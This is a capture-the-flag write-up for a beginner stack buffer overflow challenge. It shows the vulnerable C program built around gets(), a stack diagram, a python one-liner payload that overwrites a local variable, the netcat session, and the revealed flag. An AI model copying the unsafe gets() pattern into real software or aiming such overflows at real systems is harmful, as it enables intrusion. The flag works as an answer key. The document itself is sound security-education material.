---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

> Want to learn the hacker's secret? Try to smash this buffer!
> You need guidance? Look no further than to [Mr. Liveoverflow](https://old.liveoverflow.com/binary_hacking/protostar/stack0.html). He puts out nice videos you should look if you haven't already
> `nc thekidofarcrania.com 35235`
> [bof.c](https://ctflearn.com/challenge/download/1010) 

## bof.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);
void safeguard();

void print_flag();

void vuln() {
  char padding[16];
  char buff[32];
  int notsecret = 0xffffff00;
  int secret = 0xdeadbeef;

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff);

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff);

  // Check if secret has changed.
  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    print_flag(); // Print out the flag. You deserve it.
    return;
  } else if (notsecret != 0xffffff00) {
    puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
  } else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  } else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
  }

  exit(0);
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  safeguard();
  vuln();
}
```
- The program sets a buffer of 32 bytes and then padding of 16 bytes.
- It then creates two variables `notsecret` and `secret` and sets their value to `0xffffff00` and `0xdeadbeef` respectively.

## Stack
```        
           +---------------------------+
0xffbbf4e8 |  00 00 00 00 00 00 00 00  | < buffer
0xffbbf4f0 |  00 00 00 00 00 00 00 00  |
0xffbbf4f8 |  00 00 00 00 00 00 00 00  |
0xffbbf500 |  00 00 00 00 00 00 00 00  |
           +---------------------------+
0xffbbf508 |  ff ff ff ff ff ff ff ff  | < padding
0xffbbf510 |  ff ff ff ff ff ff ff ff  |
           +-------------+-------------+
0xffbbf518 | ef be ad de | 00 ff ff ff |
           +-------------+-------------+
             ^             ^
             secret        notsecret
```
- The program then has four conditional statements:
	1. Executes if the value of `secret` has been set to `0x67616c66` and prints out the flag.
	2. Executes if the value of `notsecret` has been altered.
	3. Executes if the value of `secret` has been altered but not set to `0x667616c66`.
	4. Executes if none of the above conditions are met.
- We need 48 bytes to fill the buffer and the padding and then `0x67616c66`.

## Exploit
```
$ python3 -c 'print("a"*48 + "\x66\x6c\x61\x67")'
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag
```
- Note that `0x67616c66` is written in little endian format. 
- Let's provide the string as the input.
```
$ nc thekidofarcrania.com 35235

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xfff45058 | 00 00 00 00 00 00 00 00 |
0xfff45060 | 00 00 00 00 00 00 00 00 |
0xfff45068 | 00 00 00 00 00 00 00 00 |
0xfff45070 | 00 00 00 00 00 00 00 00 |
0xfff45078 | ff ff ff ff ff ff ff ff |
0xfff45080 | ff ff ff ff ff ff ff ff |
0xfff45088 | ef be ad de 00 ff ff ff |
0xfff45090 | c0 55 f6 f7 84 1f 64 56 |
0xfff45098 | a8 50 f4 ff 11 fb 63 56 |
0xfff450a0 | c0 50 f4 ff 00 00 00 00 |

Input some text: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaflag

Legend: buff MODIFIED padding MODIFIED
  notsecret MODIFIED secret MODIFIED CORRECT secret
0xfff45058 | 61 61 61 61 61 61 61 61 |
0xfff45060 | 61 61 61 61 61 61 61 61 |
0xfff45068 | 61 61 61 61 61 61 61 61 |
0xfff45070 | 61 61 61 61 61 61 61 61 |
0xfff45078 | 61 61 61 61 61 61 61 61 |
0xfff45080 | 61 61 61 61 61 61 61 61 |
0xfff45088 | 66 6c 61 67 00 ff ff ff |
0xfff45090 | c0 55 f6 f7 84 1f 64 56 |
0xfff45098 | a8 50 f4 ff 11 fb 63 56 |
0xfff450a0 | c0 50 f4 ff 00 00 00 00 |

You did it! Congratuations!
CTFlearn{buffer_0verflows_4re_c00l!}
```

## Flag
```
CTFlearn{buffer_0verflows_4re_c00l!}
```
